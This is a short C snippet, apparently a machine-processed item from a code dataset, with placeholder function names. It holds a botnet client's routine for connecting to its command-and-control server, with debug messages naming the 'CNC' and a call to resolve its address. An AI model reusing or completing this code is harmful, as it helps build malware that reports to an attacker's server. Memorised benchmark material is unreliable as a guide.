#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  F_GETFL ; 
 int /*<<< orphan*/  F_SETFL ; 
 int O_NONBLOCK ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  TRUE ; 
 int /*<<< orphan*/  FUNC0 (int,struct sockaddr*,int) ; 
 int errno ; 
 int FUNC1 (int,int /*<<< orphan*/ ,int) ; 
 int fd_serv ; 
 int /*<<< orphan*/  pending_connection ; 
 int /*<<< orphan*/  FUNC2 (char*,...) ; 
 int /*<<< orphan*/  FUNC3 () ; 
 int FUNC4 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  srv_addr ; 

__attribute__((used)) static void FUNC5(void)
{
#ifdef DEBUG
    printf("[main] Attempting to connect to CNC\n");
#endif

    if ((fd_serv = FUNC4(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[main] Failed to call socket(). Errno = %d\n", errno);
#endif
        return;
    }

    FUNC1(fd_serv, F_SETFL, O_NONBLOCK | FUNC1(fd_serv, F_GETFL, 0));

    // Should call resolve_cnc_addr
    if (&resolve_func != NULL)
        FUNC3();

    pending_connection = TRUE;
    FUNC0(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}